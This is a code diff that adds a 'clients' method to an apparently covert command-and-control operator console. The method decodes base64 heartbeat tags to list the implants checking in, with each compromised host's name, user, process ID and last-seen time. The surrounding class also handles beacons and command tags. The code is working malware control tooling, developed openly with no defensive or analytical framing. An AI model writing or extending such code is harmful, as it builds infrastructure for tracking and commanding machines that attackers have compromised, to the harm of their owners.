@@ -240,6 +240,51 @@ class Operator:
         if not names:
             print("[i] no beacons")
 
+    def clients(self):
+        """List the implants currently checking in, one line per client."""
+        import base64
+        import time as _t
+        tags = self._fetch()
+        beats = [t for t in tags if t.startswith(HBT_PREFIX)]
+        if not beats:
+            print("[i] no clients have checked in")
+            return []
+        rows = {}
+        for tag in beats:
+            body = tag[len(HBT_PREFIX):]
+            ident = None
+            try:
+                raw = base64.urlsafe_b64decode(
+                    body + "=" * (-len(body) % 4)).decode()
+                parts = raw.split("|")
+                if len(parts) == 4 and parts[3].isdigit():
+                    ident = (parts[0], parts[1], parts[2], int(parts[3]))
+            except Exception:                            # noqa: BLE001
+                ident = None
+            if ident is None:
+                continue          # legacy heartbeat: random nonce, no identity
+            key = (ident[0], ident[1], ident[2])
+            # Keep the most recent beat per client.
+            if key not in rows or ident[3] > rows[key][1]:
+                rows[key] = (tag, ident[3])
+        if not rows:
+            print(f"[i] {len(beats)} heartbeat(s), none identifiable "
+                  "(written by an older implant)")
+            return []
+        now = int(_t.time())
+        out = []
+        print(f"[+] {len(rows)} client(s) connected")
+        print(f"    {'HOST':24} {'USER':14} {'PID':>7}  {'LAST SEEN':>10}  TAG")
+        for (host, user, pid), (tag, ts) in sorted(rows.items(),
+                                                   key=lambda kv: -kv[1][1]):
+            age = now - ts
+            seen = f"{age}s ago" if age < 120 else f"{age // 60}m ago"
+            print(f"    {host[:24]:24} {user[:14]:14} {pid:>7}  {seen:>10}  "
+                  f"{tag[:20]}")
+            out.append({"host": host, "user": user, "pid": pid,
+                        "ts": ts, "age": age, "tag": tag})
+        return out
+
     def stats(self):
         tags = self._fetch()
         cmds = [t for t in tags if t.startswith(CMD_PREFIX)]
